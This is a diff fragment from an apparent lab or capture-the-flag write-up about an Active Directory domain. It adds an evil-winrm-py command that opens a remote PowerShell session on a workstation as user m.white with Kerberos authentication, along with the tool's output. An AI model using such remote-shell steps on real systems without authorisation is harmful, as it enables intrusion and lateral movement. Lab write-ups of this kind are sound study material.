@@ -412,5 +412,16 @@ SMB         dc01.orion.local 445    DC01             [+] ORION.LOCAL\m.white fro
 First ill generate a realm
 
 ```python
+❯❯❯ evil-winrm-py -i ws-it.orion.local -u m.white -k --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
 
+[*] Connecting to 'ws-it.orion.local:5985' as 'm.white'
+evil-winrm-py PS C:\Users\m.white\Documents>
 ```
+
+Then i can login as this user
+
